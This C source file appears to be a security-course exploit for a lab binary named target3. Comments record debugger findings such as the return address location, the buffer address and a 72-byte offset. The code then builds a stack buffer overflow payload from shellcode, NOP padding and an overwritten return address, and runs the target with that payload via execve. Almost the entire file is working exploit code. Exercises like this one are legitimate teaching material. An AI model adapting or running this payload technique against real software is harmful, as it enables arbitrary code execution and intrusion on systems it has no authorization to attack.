#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

///// IN Foo: 
//rip at 0x3021fe98
//0x3021fe98: 0x400cd2
//Therefore, the return address once main completes, is 0x400cd2
//p &buf
//$1 = (char (*)[64]) 0x3021fe50

///// In Bar:
//rip at 0x3021fe38
//0x3021fe38: 0x400c68
//Therefore, the return address once main completes, is 0x400c68

//targ (buf[64]) can only hold 64 bytes
//bar function copies up to 88 bytes into targ
//Therefore, the address of buf is 0x3021fe50 to 0x3021fe50+64 = 0x3021FE90

//The difference between the rip (program counter) and the address of buf is 0x3021fe98 - 0x3021fe50 = 0x48 = 72
//"AAAA" takes up 4 bytes
//Then we need to fill the buffer with 68 bytes of shellcode, and No-OPs
//Then 4 bytes of the return address of buffer + 4 (0x3021fe54)
//Followed by a '\0'

#define BUF_SIZE 73
#define NOP 0x90

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char bufferExploit[BUF_SIZE];

	//Fill the first bytes with shellcode
	int i;
	for (i = 0; i < strlen(shellcode); i++) {
		bufferExploit[i] = shellcode[i];
	}

	//Fill the remaining bytes with No-OPs
	for (; i < BUF_SIZE - 5; i++) {
		bufferExploit[i] = NOP;
	}

	//Fill the last bytes with the return address of buffer
	int *newReturnAddress = (int *)&bufferExploit[BUF_SIZE - 5];

	//New Return Address is now 0x3021fe50 + 4 to ignore "AAAA"
	*newReturnAddress = 0x3021fe54;

	//The bufferExploit string will end with NULL
    bufferExploit[72] = '\0';

	args[0] = TARGET;
	//args[1] = "hi there";
	args[1] = bufferExploit;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
